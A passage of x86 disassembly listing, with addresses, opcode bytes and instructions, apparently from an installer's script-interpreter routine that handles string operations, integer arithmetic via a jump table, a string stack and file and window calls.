  4016ce:	e9 4a 0c 00 00       	jmp    0x40231d
  4016d3:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4016d6:	0f 84 7e 12 00 00    	je     0x40295a
  4016dc:	56                   	push   %esi
  4016dd:	e8 f7 51 00 00       	call   0x4068d9
  4016e2:	85 c0                	test   %eax,%eax
  4016e4:	0f 84 70 12 00 00    	je     0x40295a
  4016ea:	57                   	push   %edi
  4016eb:	56                   	push   %esi
  4016ec:	e8 4b 4c 00 00       	call   0x40633c
  4016f1:	6a e4                	push   $0xffffffe4
  4016f3:	e9 25 0c 00 00       	jmp    0x40231d
  4016f8:	53                   	push   %ebx
  4016f9:	e8 d4 16 00 00       	call   0x402dd2
  4016fe:	8b 7d f4             	mov    -0xc(%ebp),%edi
  401701:	8b f0                	mov    %eax,%esi
  401703:	8d 45 08             	lea    0x8(%ebp),%eax
  401706:	50                   	push   %eax
  401707:	57                   	push   %edi
  401708:	68 00 04 00 00       	push   $0x400
  40170d:	56                   	push   %esi
  40170e:	ff 15 e8 80 40 00    	call   *0x4080e8
  401714:	85 c0                	test   %eax,%eax
  401716:	74 24                	je     0x40173c
  401718:	8b 45 08             	mov    0x8(%ebp),%eax
  40171b:	3b c6                	cmp    %esi,%eax
  40171d:	76 27                	jbe    0x401746
  40171f:	66 39 18             	cmp    %bx,(%eax)
  401722:	74 22                	je     0x401746
  401724:	56                   	push   %esi
  401725:	e8 af 51 00 00       	call   0x4068d9
  40172a:	3b c3                	cmp    %ebx,%eax
  40172c:	74 0e                	je     0x40173c
  40172e:	83 c0 2c             	add    $0x2c,%eax
  401731:	50                   	push   %eax
  401732:	ff 75 08             	push   0x8(%ebp)
  401735:	e8 42 4e 00 00       	call   0x40657c
  40173a:	eb 0a                	jmp    0x401746
  40173c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401743:	66 89 1f             	mov    %bx,(%edi)
  401746:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401749:	0f 85 07 15 00 00    	jne    0x402c56
  40174f:	68 00 04 00 00       	push   $0x400
  401754:	57                   	push   %edi
  401755:	57                   	push   %edi
  401756:	ff 15 ec 80 40 00    	call   *0x4080ec
  40175c:	e9 f5 14 00 00       	jmp    0x402c56
  401761:	6a ff                	push   $0xffffffff
  401763:	e8 6a 16 00 00       	call   0x402dd2
  401768:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40176b:	51                   	push   %ecx
  40176c:	57                   	push   %edi
  40176d:	68 00 04 00 00       	push   $0x400
  401772:	53                   	push   %ebx
  401773:	50                   	push   %eax
  401774:	53                   	push   %ebx
  401775:	ff 15 f0 80 40 00    	call   *0x4080f0
  40177b:	85 c0                	test   %eax,%eax
  40177d:	0f 85 d3 14 00 00    	jne    0x402c56
  401783:	e9 a0 11 00 00       	jmp    0x402928
  401788:	6a ef                	push   $0xffffffef
  40178a:	e8 43 16 00 00       	call   0x402dd2
  40178f:	50                   	push   %eax
  401790:	57                   	push   %edi
  401791:	e8 05 49 00 00       	call   0x40609b
  401796:	e9 3e fe ff ff       	jmp    0x4015d9
  40179b:	6a 31                	push   $0x31
  40179d:	e8 30 16 00 00       	call   0x402dd2
  4017a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4017a5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4017a8:	ff 75 f8             	push   -0x8(%ebp)
  4017ab:	83 e0 07             	and    $0x7,%eax
  4017ae:	89 45 08             	mov    %eax,0x8(%ebp)
  4017b1:	e8 0c 47 00 00       	call   0x405ec2
  4017b6:	ff 75 f8             	push   -0x8(%ebp)
  4017b9:	bf c8 a5 40 00       	mov    $0x40a5c8,%edi
  4017be:	85 c0                	test   %eax,%eax
  4017c0:	74 08                	je     0x4017ca
  4017c2:	57                   	push   %edi
  4017c3:	e8 b4 4d 00 00       	call   0x40657c
  4017c8:	eb 17                	jmp    0x4017e1
  4017ca:	68 00 50 43 00       	push   $0x435000
  4017cf:	57                   	push   %edi
  4017d0:	e8 a7 4d 00 00       	call   0x40657c
  4017d5:	50                   	push   %eax
  4017d6:	e8 70 46 00 00       	call   0x405e4b
  4017db:	50                   	push   %eax
  4017dc:	e8 b7 4d 00 00       	call   0x406598
  4017e1:	57                   	push   %edi
  4017e2:	e8 43 50 00 00       	call   0x40682a
  4017e7:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017eb:	7c 31                	jl     0x40181e
  4017ed:	57                   	push   %edi
  4017ee:	e8 e6 50 00 00       	call   0x4068d9
  4017f3:	33 c9                	xor    %ecx,%ecx
  4017f5:	3b c3                	cmp    %ebx,%eax
  4017f7:	74 10                	je     0x401809
  4017f9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017fc:	83 c0 14             	add    $0x14,%eax
  4017ff:	51                   	push   %ecx
  401800:	50                   	push   %eax
  401801:	ff 15 f4 80 40 00    	call   *0x4080f4
  401807:	8b c8                	mov    %eax,%ecx
  401809:	8b 45 08             	mov    0x8(%ebp),%eax
  40180c:	83 c0 fd             	add    $0xfffffffd,%eax
  40180f:	0d 00 00 00 80       	or     $0x80000000,%eax
  401814:	23 c1                	and    %ecx,%eax
  401816:	f7 d8                	neg    %eax
  401818:	1b c0                	sbb    %eax,%eax
  40181a:	40                   	inc    %eax
  40181b:	89 45 08             	mov    %eax,0x8(%ebp)
  40181e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401821:	75 06                	jne    0x401829
  401823:	57                   	push   %edi
  401824:	e8 1e 48 00 00       	call   0x406047
  401829:	33 c0                	xor    %eax,%eax
  40182b:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40182f:	0f 95 c0             	setne  %al
  401832:	40                   	inc    %eax
  401833:	50                   	push   %eax
  401834:	68 00 00 00 40       	push   $0x40000000
  401839:	57                   	push   %edi
  40183a:	e8 2d 48 00 00       	call   0x40606c
  40183f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401842:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401845:	75 72                	jne    0x4018b9
  401847:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40184a:	75 4f                	jne    0x40189b
  40184c:	56                   	push   %esi
  40184d:	68 c8 b5 40 00       	push   $0x40b5c8
  401852:	e8 25 4d 00 00       	call   0x40657c
  401857:	57                   	push   %edi
  401858:	56                   	push   %esi
  401859:	e8 1e 4d 00 00       	call   0x40657c
  40185e:	ff 75 e4             	push   -0x1c(%ebp)
  401861:	68 c8 ad 40 00       	push   $0x40adc8
  401866:	e8 4e 4d 00 00       	call   0x4065b9
  40186b:	68 c8 b5 40 00       	push   $0x40b5c8
  401870:	56                   	push   %esi
  401871:	e8 06 4d 00 00       	call   0x40657c
  401876:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401879:	c1 f8 03             	sar    $0x3,%eax
  40187c:	50                   	push   %eax
  40187d:	68 c8 ad 40 00       	push   $0x40adc8
  401882:	e8 55 43 00 00       	call   0x405bdc
  401887:	83 e8 04             	sub    $0x4,%eax
  40188a:	0f 84 57 ff ff ff    	je     0x4017e7
  401890:	48                   	dec    %eax
  401891:	74 1b                	je     0x4018ae
  401893:	57                   	push   %edi
  401894:	6a fa                	push   $0xfffffffa
  401896:	e9 f8 fb ff ff       	jmp    0x401493
  40189b:	ff 75 f8             	push   -0x8(%ebp)
  40189e:	6a e2                	push   $0xffffffe2
  4018a0:	e8 5c 3d 00 00       	call   0x405601
  4018a5:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4018a9:	e9 2d fd ff ff       	jmp    0x4015db
  4018ae:	ff 05 a8 9a 42 00    	incl   0x429aa8
  4018b4:	e9 a6 13 00 00       	jmp    0x402c5f
  4018b9:	ff 75 f8             	push   -0x8(%ebp)
  4018bc:	6a ea                	push   $0xffffffea
  4018be:	e8 3e 3d 00 00       	call   0x405601
  4018c3:	ff 05 d4 9a 42 00    	incl   0x429ad4
  4018c9:	53                   	push   %ebx
  4018ca:	53                   	push   %ebx
  4018cb:	ff 75 c8             	push   -0x38(%ebp)
  4018ce:	ff 75 d8             	push   -0x28(%ebp)
  4018d1:	e8 3e 1a 00 00       	call   0x403314
  4018d6:	ff 0d d4 9a 42 00    	decl   0x429ad4
  4018dc:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018e0:	8b f0                	mov    %eax,%esi
  4018e2:	75 06                	jne    0x4018ea
  4018e4:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018e8:	74 12                	je     0x4018fc
  4018ea:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018ed:	50                   	push   %eax
  4018ee:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018f1:	53                   	push   %ebx
  4018f2:	50                   	push   %eax
  4018f3:	ff 75 c8             	push   -0x38(%ebp)
  4018f6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018fc:	ff 75 c8             	push   -0x38(%ebp)
  4018ff:	ff 15 fc 80 40 00    	call   *0x4080fc
  401905:	3b f3                	cmp    %ebx,%esi
  401907:	0f 8d 49 13 00 00    	jge    0x402c56
  40190d:	83 fe fe             	cmp    $0xfffffffe,%esi
  401910:	75 13                	jne    0x401925
  401912:	6a e9                	push   $0xffffffe9
  401914:	57                   	push   %edi
  401915:	e8 9f 4c 00 00       	call   0x4065b9
  40191a:	ff 75 f8             	push   -0x8(%ebp)
  40191d:	57                   	push   %edi
  40191e:	e8 75 4c 00 00       	call   0x406598
  401923:	eb 08                	jmp    0x40192d
  401925:	6a ee                	push   $0xffffffee
  401927:	57                   	push   %edi
  401928:	e8 8c 4c 00 00       	call   0x4065b9
  40192d:	68 10 00 20 00       	push   $0x200010
  401932:	57                   	push   %edi
  401933:	e9 8c 0a 00 00       	jmp    0x4023c4
  401938:	53                   	push   %ebx
  401939:	eb 34                	jmp    0x40196f
  40193b:	6a 31                	push   $0x31
  40193d:	e8 90 14 00 00       	call   0x402dd2
  401942:	ff 75 d0             	push   -0x30(%ebp)
  401945:	50                   	push   %eax
  401946:	e8 91 42 00 00       	call   0x405bdc
  40194b:	3b c3                	cmp    %ebx,%eax
  40194d:	0f 84 07 10 00 00    	je     0x40295a
  401953:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  401956:	0f 84 6c 01 00 00    	je     0x401ac8
  40195c:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40195f:	0f 85 f1 12 00 00    	jne    0x402c56
  401965:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401968:	e9 f4 12 00 00       	jmp    0x402c61
  40196d:	6a f0                	push   $0xfffffff0
  40196f:	e8 5e 14 00 00       	call   0x402dd2
  401974:	ff 75 d4             	push   -0x2c(%ebp)
  401977:	50                   	push   %eax
  401978:	e8 0b 43 00 00       	call   0x405c88
  40197d:	e9 d4 12 00 00       	jmp    0x402c56
  401982:	6a 01                	push   $0x1
  401984:	e8 49 14 00 00       	call   0x402dd2
  401989:	50                   	push   %eax
  40198a:	e8 03 4c 00 00       	call   0x406592
  40198f:	e9 d0 0c 00 00       	jmp    0x402664
  401994:	6a 02                	push   $0x2
  401996:	e8 15 14 00 00       	call   0x402db0
  40199b:	6a 03                	push   $0x3
  40199d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4019a0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4019a3:	e8 08 14 00 00       	call   0x402db0
  4019a8:	59                   	pop    %ecx
  4019a9:	8b f0                	mov    %eax,%esi
  4019ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4019ae:	59                   	pop    %ecx
  4019af:	6a 01                	push   $0x1
  4019b1:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4019b4:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4019b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ba:	e8 13 14 00 00       	call   0x402dd2
  4019bf:	50                   	push   %eax
  4019c0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4019c3:	e8 ca 4b 00 00       	call   0x406592
  4019c8:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4019cb:	66 89 1f             	mov    %bx,(%edi)
  4019ce:	75 03                	jne    0x4019d3
  4019d0:	89 45 08             	mov    %eax,0x8(%ebp)
  4019d3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d6:	0f 84 7a 12 00 00    	je     0x402c56
  4019dc:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019df:	3b cb                	cmp    %ebx,%ecx
  4019e1:	7d 0b                	jge    0x4019ee
  4019e3:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019e6:	3b f3                	cmp    %ebx,%esi
  4019e8:	0f 8c 68 12 00 00    	jl     0x402c56
  4019ee:	3b f0                	cmp    %eax,%esi
  4019f0:	7e 02                	jle    0x4019f4
  4019f2:	8b f0                	mov    %eax,%esi
  4019f4:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019f7:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019fa:	50                   	push   %eax
  4019fb:	57                   	push   %edi
  4019fc:	e8 7b 4b 00 00       	call   0x40657c
  401a01:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401a04:	7d 0e                	jge    0x401a14
  401a06:	57                   	push   %edi
  401a07:	e8 86 4b 00 00       	call   0x406592
  401a0c:	01 45 08             	add    %eax,0x8(%ebp)
  401a0f:	79 03                	jns    0x401a14
  401a11:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a14:	8b 45 08             	mov    0x8(%ebp),%eax
  401a17:	3d 00 04 00 00       	cmp    $0x400,%eax
  401a1c:	0f 8d 34 12 00 00    	jge    0x402c56
  401a22:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  401a26:	e9 2b 12 00 00       	jmp    0x402c56
  401a2b:	6a 20                	push   $0x20
  401a2d:	e8 a0 13 00 00       	call   0x402dd2
  401a32:	6a 31                	push   $0x31
  401a34:	8b f0                	mov    %eax,%esi
  401a36:	e8 97 13 00 00       	call   0x402dd2
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	50                   	push   %eax
  401a3f:	56                   	push   %esi
  401a40:	75 12                	jne    0x401a54
  401a42:	ff 15 00 81 40 00    	call   *0x408100
  401a48:	85 c0                	test   %eax,%eax
  401a4a:	75 7c                	jne    0x401ac8
  401a4c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a4f:	e9 0d 12 00 00       	jmp    0x402c61
  401a54:	ff 15 04 81 40 00    	call   *0x408104
  401a5a:	eb ec                	jmp    0x401a48
  401a5c:	33 f6                	xor    %esi,%esi
  401a5e:	46                   	inc    %esi
  401a5f:	56                   	push   %esi
  401a60:	e8 6d 13 00 00       	call   0x402dd2
  401a65:	68 00 04 00 00       	push   $0x400
  401a6a:	57                   	push   %edi
  401a6b:	50                   	push   %eax
  401a6c:	89 45 08             	mov    %eax,0x8(%ebp)
  401a6f:	ff 15 08 81 40 00    	call   *0x408108
  401a75:	85 c0                	test   %eax,%eax
  401a77:	74 13                	je     0x401a8c
  401a79:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a7c:	74 14                	je     0x401a92
  401a7e:	57                   	push   %edi
  401a7f:	ff 75 08             	push   0x8(%ebp)
  401a82:	ff 15 04 81 40 00    	call   *0x408104
  401a88:	85 c0                	test   %eax,%eax
  401a8a:	75 06                	jne    0x401a92
  401a8c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a8f:	66 89 1f             	mov    %bx,(%edi)
  401a92:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a99:	e9 b8 11 00 00       	jmp    0x402c56
  401a9e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401aa1:	53                   	push   %ebx
  401aa2:	e8 09 13 00 00       	call   0x402db0
  401aa7:	6a 01                	push   $0x1
  401aa9:	8b f8                	mov    %eax,%edi
  401aab:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aae:	e8 fd 12 00 00       	call   0x402db0
  401ab3:	59                   	pop    %ecx
  401ab4:	3b f3                	cmp    %ebx,%esi
  401ab6:	59                   	pop    %ecx
  401ab7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aba:	75 08                	jne    0x401ac4
  401abc:	3b f8                	cmp    %eax,%edi
  401abe:	7c 08                	jl     0x401ac8
  401ac0:	7e 8a                	jle    0x401a4c
  401ac2:	eb 12                	jmp    0x401ad6
  401ac4:	3b f8                	cmp    %eax,%edi
  401ac6:	73 08                	jae    0x401ad0
  401ac8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401acb:	e9 91 11 00 00       	jmp    0x402c61
  401ad0:	0f 86 76 ff ff ff    	jbe    0x401a4c
  401ad6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ad9:	e9 83 11 00 00       	jmp    0x402c61
  401ade:	6a 01                	push   $0x1
  401ae0:	e8 cb 12 00 00       	call   0x402db0
  401ae5:	8b f0                	mov    %eax,%esi
  401ae7:	6a 02                	push   $0x2
  401ae9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aec:	89 75 08             	mov    %esi,0x8(%ebp)
  401aef:	e8 bc 12 00 00       	call   0x402db0
  401af4:	59                   	pop    %ecx
  401af5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401af8:	59                   	pop    %ecx
  401af9:	8b c8                	mov    %eax,%ecx
  401afb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401afe:	83 f8 0d             	cmp    $0xd,%eax
  401b01:	0f 87 94 00 00 00    	ja     0x401b9b
  401b07:	ff 24 85 78 2d 40 00 	jmp    *0x402d78(,%eax,4)
  401b0e:	03 f1                	add    %ecx,%esi
  401b10:	e9 5f 03 00 00       	jmp    0x401e74
  401b15:	2b f1                	sub    %ecx,%esi
  401b17:	e9 58 03 00 00       	jmp    0x401e74
  401b1c:	0f af ce             	imul   %esi,%ecx
  401b1f:	eb 1a                	jmp    0x401b3b
  401b21:	3b cb                	cmp    %ebx,%ecx
  401b23:	74 53                	je     0x401b78
  401b25:	8b c6                	mov    %esi,%eax
  401b27:	99                   	cltd
  401b28:	f7 f9                	idiv   %ecx
  401b2a:	8b f0                	mov    %eax,%esi
  401b2c:	e9 43 03 00 00       	jmp    0x401e74
  401b31:	0b ce                	or     %esi,%ecx
  401b33:	eb 06                	jmp    0x401b3b
  401b35:	23 ce                	and    %esi,%ecx
  401b37:	eb 02                	jmp    0x401b3b
  401b39:	33 ce                	xor    %esi,%ecx
  401b3b:	8b f1                	mov    %ecx,%esi
  401b3d:	e9 32 03 00 00       	jmp    0x401e74
  401b42:	33 c0                	xor    %eax,%eax
  401b44:	3b f3                	cmp    %ebx,%esi
  401b46:	0f 94 c0             	sete   %al
  401b49:	eb df                	jmp    0x401b2a
  401b4b:	3b f3                	cmp    %ebx,%esi
  401b4d:	75 11                	jne    0x401b60
  401b4f:	eb 0b                	jmp    0x401b5c
  401b51:	33 f6                	xor    %esi,%esi
  401b53:	e9 1c 03 00 00       	jmp    0x401e74
  401b58:	3b f3                	cmp    %ebx,%esi
  401b5a:	74 f5                	je     0x401b51
  401b5c:	3b cb                	cmp    %ebx,%ecx
  401b5e:	74 f1                	je     0x401b51
  401b60:	33 f6                	xor    %esi,%esi
  401b62:	46                   	inc    %esi
  401b63:	e9 0c 03 00 00       	jmp    0x401e74
  401b68:	3b cb                	cmp    %ebx,%ecx
  401b6a:	74 0c                	je     0x401b78
  401b6c:	8b c6                	mov    %esi,%eax
  401b6e:	99                   	cltd
  401b6f:	f7 f9                	idiv   %ecx
  401b71:	8b f2                	mov    %edx,%esi
  401b73:	e9 fc 02 00 00       	jmp    0x401e74
  401b78:	33 f6                	xor    %esi,%esi
  401b7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b81:	e9 ee 02 00 00       	jmp    0x401e74
  401b86:	d3 e6                	shl    %cl,%esi
  401b88:	e9 e7 02 00 00       	jmp    0x401e74
  401b8d:	d3 fe                	sar    %cl,%esi
  401b8f:	e9 e0 02 00 00       	jmp    0x401e74
  401b94:	d3 ee                	shr    %cl,%esi
  401b96:	e9 d9 02 00 00       	jmp    0x401e74
  401b9b:	8b 75 08             	mov    0x8(%ebp),%esi
  401b9e:	e9 d1 02 00 00       	jmp    0x401e74
  401ba3:	6a 01                	push   $0x1
  401ba5:	e8 28 12 00 00       	call   0x402dd2
  401baa:	6a 02                	push   $0x2
  401bac:	8b f0                	mov    %eax,%esi
  401bae:	e8 fd 11 00 00       	call   0x402db0
  401bb3:	50                   	push   %eax
  401bb4:	56                   	push   %esi
  401bb5:	57                   	push   %edi
  401bb6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401bb9:	ff 15 2c 82 40 00    	call   *0x40822c
  401bbf:	83 c4 10             	add    $0x10,%esp
  401bc2:	e9 8f 10 00 00       	jmp    0x402c56
  401bc7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401bca:	8b 35 28 ce 40 00    	mov    0x40ce28,%esi
  401bd0:	3b c3                	cmp    %ebx,%eax
  401bd2:	74 44                	je     0x401c18
  401bd4:	48                   	dec    %eax
  401bd5:	3b f3                	cmp    %ebx,%esi
  401bd7:	0f 84 d9 07 00 00    	je     0x4023b6
  401bdd:	8b 36                	mov    (%esi),%esi
  401bdf:	3b c3                	cmp    %ebx,%eax
  401be1:	75 f1                	jne    0x401bd4
  401be3:	3b f3                	cmp    %ebx,%esi
  401be5:	0f 84 cb 07 00 00    	je     0x4023b6
  401beb:	83 c6 04             	add    $0x4,%esi
  401bee:	bf c8 a5 40 00       	mov    $0x40a5c8,%edi
  401bf3:	56                   	push   %esi
  401bf4:	57                   	push   %edi
  401bf5:	e8 82 49 00 00       	call   0x40657c
  401bfa:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  401bff:	83 c0 04             	add    $0x4,%eax
  401c02:	50                   	push   %eax
  401c03:	56                   	push   %esi
  401c04:	e8 73 49 00 00       	call   0x40657c
  401c09:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  401c0e:	57                   	push   %edi
  401c0f:	83 c0 04             	add    $0x4,%eax
  401c12:	50                   	push   %eax
  401c13:	e9 a8 0e 00 00       	jmp    0x402ac0
  401c18:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401c1b:	74 25                	je     0x401c42
  401c1d:	3b f3                	cmp    %ebx,%esi
  401c1f:	0f 84 35 0d 00 00    	je     0x40295a
  401c25:	8d 46 04             	lea    0x4(%esi),%eax
  401c28:	50                   	push   %eax
  401c29:	57                   	push   %edi
  401c2a:	e8 4d 49 00 00       	call   0x40657c
  401c2f:	8b 06                	mov    (%esi),%eax
  401c31:	56                   	push   %esi
  401c32:	a3 28 ce 40 00       	mov    %eax,0x40ce28
  401c37:	ff 15 0c 81 40 00    	call   *0x40810c
  401c3d:	e9 14 10 00 00       	jmp    0x402c56
  401c42:	68 04 08 00 00       	push   $0x804
  401c47:	6a 40                	push   $0x40
  401c49:	ff 15 10 81 40 00    	call   *0x408110
  401c4f:	ff 75 d0             	push   -0x30(%ebp)
  401c52:	8b f0                	mov    %eax,%esi
  401c54:	8d 46 04             	lea    0x4(%esi),%eax
  401c57:	50                   	push   %eax
  401c58:	e8 5c 49 00 00       	call   0x4065b9
  401c5d:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  401c62:	89 06                	mov    %eax,(%esi)
  401c64:	89 35 28 ce 40 00    	mov    %esi,0x40ce28
  401c6a:	e9 e7 0f 00 00       	jmp    0x402c56
  401c6f:	6a 03                	push   $0x3
  401c71:	e8 3a 11 00 00       	call   0x402db0
  401c76:	6a 04                	push   $0x4
  401c78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c7b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c7e:	e8 2d 11 00 00       	call   0x402db0
  401c83:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c87:	59                   	pop    %ecx
  401c88:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c8b:	59                   	pop    %ecx
  401c8c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c8f:	74 0a                	je     0x401c9b
  401c91:	6a 33                	push   $0x33
  401c93:	e8 3a 11 00 00       	call   0x402dd2
  401c98:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c9b:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c9f:	74 0a                	je     0x401cab
  401ca1:	6a 44                	push   $0x44
  401ca3:	e8 2a 11 00 00       	call   0x402dd2
  401ca8:	89 45 08             	mov    %eax,0x8(%ebp)
  401cab:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401caf:	6a 01                	push   $0x1
  401cb1:	75 4c                	jne    0x401cff
  401cb3:	e8 f8 10 00 00       	call   0x402db0
  401cb8:	6a 02                	push   $0x2
  401cba:	8b f0                	mov    %eax,%esi
  401cbc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cbf:	e8 ec 10 00 00       	call   0x402db0
  401cc4:	59                   	pop    %ecx
  401cc5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cc8:	59                   	pop    %ecx
  401cc9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ccc:	c1 f9 02             	sar    $0x2,%ecx
  401ccf:	74 1e                	je     0x401cef
  401cd1:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401cd4:	52                   	push   %edx
  401cd5:	51                   	push   %ecx
  401cd6:	53                   	push   %ebx
  401cd7:	ff 75 08             	push   0x8(%ebp)
  401cda:	ff 75 e8             	push   -0x18(%ebp)
  401cdd:	50                   	push   %eax
  401cde:	56                   	push   %esi
  401cdf:	ff 15 30 82 40 00    	call   *0x408230
  401ce5:	f7 d8                	neg    %eax
  401ce7:	1b c0                	sbb    %eax,%eax
  401ce9:	40                   	inc    %eax
  401cea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ced:	eb 43                	jmp    0x401d32
  401cef:	ff 75 08             	push   0x8(%ebp)
  401cf2:	ff 75 e8             	push   -0x18(%ebp)
  401cf5:	50                   	push   %eax
  401cf6:	56                   	push   %esi
  401cf7:	ff 15 58 82 40 00    	call   *0x408258
  401cfd:	eb 30                	jmp    0x401d2f
  401cff:	e8 ce 10 00 00       	call   0x402dd2
  401d04:	6a 12                	push   $0x12
  401d06:	8b f0                	mov    %eax,%esi
  401d08:	e8 c5 10 00 00       	call   0x402dd2
  401d0d:	66 8b 08             	mov    (%eax),%cx
  401d10:	66 f7 d9             	neg    %cx
  401d13:	1b c9                	sbb    %ecx,%ecx
  401d15:	23 c8                	and    %eax,%ecx
  401d17:	66 8b 06             	mov    (%esi),%ax
  401d1a:	66 f7 d8             	neg    %ax
  401d1d:	1b c0                	sbb    %eax,%eax
  401d1f:	51                   	push   %ecx
  401d20:	23 c6                	and    %esi,%eax
  401d22:	50                   	push   %eax
  401d23:	ff 75 08             	push   0x8(%ebp)
  401d26:	ff 75 e8             	push   -0x18(%ebp)
  401d29:	ff 15 34 82 40 00    	call   *0x408234
  401d2f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d32:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d35:	0f 8c 1b 0f 00 00    	jl     0x402c56
  401d3b:	ff 75 c8             	push   -0x38(%ebp)
  401d3e:	e9 4f f8 ff ff       	jmp    0x401592
  401d43:	53                   	push   %ebx
  401d44:	e8 67 10 00 00       	call   0x402db0
  401d49:	59                   	pop    %ecx
  401d4a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4d:	50                   	push   %eax
  401d4e:	ff 15 38 82 40 00    	call   *0x408238
  401d54:	85 c0                	test   %eax,%eax
  401d56:	0f 84 f0 fc ff ff    	je     0x401a4c
  401d5c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d5f:	e9 fd 0e 00 00       	jmp    0x402c61
  401d64:	6a 02                	push   $0x2
  401d66:	e8 45 10 00 00       	call   0x402db0
  401d6b:	6a 01                	push   $0x1
  401d6d:	8b f0                	mov    %eax,%esi
  401d6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d72:	e8 39 10 00 00       	call   0x402db0
  401d77:	59                   	pop    %ecx
  401d78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d7b:	59                   	pop    %ecx
  401d7c:	56                   	push   %esi
  401d7d:	50                   	push   %eax
  401d7e:	ff 15 3c 82 40 00    	call   *0x40823c
  401d84:	e9 db 08 00 00       	jmp    0x402664
  401d89:	a1 68 9a 42 00       	mov    0x429a68,%eax
  401d8e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d91:	53                   	push   %ebx
  401d92:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d95:	e8 16 10 00 00       	call   0x402db0
  401d9a:	59                   	pop    %ecx
  401d9b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d9e:	56                   	push   %esi
  401d9f:	6a eb                	push   $0xffffffeb
  401da1:	50                   	push   %eax
  401da2:	ff 15 40 82 40 00    	call   *0x408240
  401da8:	e9 a9 0e 00 00       	jmp    0x402c56
  401dad:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401db1:	74 0d                	je     0x401dc0
  401db3:	6a 02                	push   $0x2
  401db5:	e8 f6 0f 00 00       	call   0x402db0
  401dba:	59                   	pop    %ecx
  401dbb:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401dbe:	eb 0c                	jmp    0x401dcc
  401dc0:	ff 75 d8             	push   -0x28(%ebp)
  401dc3:	ff 75 f8             	push   -0x8(%ebp)
  401dc6:	ff 15 3c 82 40 00    	call   *0x40823c
  401dcc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401dcf:	89 45 08             	mov    %eax,0x8(%ebp)
